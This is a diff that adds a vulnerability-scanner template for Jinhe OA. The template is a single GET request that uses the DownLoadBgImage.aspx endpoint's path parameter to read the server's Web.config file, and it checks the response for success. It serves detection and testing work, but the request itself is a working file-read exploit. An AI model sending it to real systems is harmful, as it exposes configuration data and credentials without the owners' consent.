@@ -1,0 +1,11 @@
+name: 金和OA-DownLoadBgImage-文件读取
+description: >-
+  文件读取,可读取/C6/js/PasswordNew.js
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/Web.config
+    expression:
+      status: 200
+      body_all: ["config"]
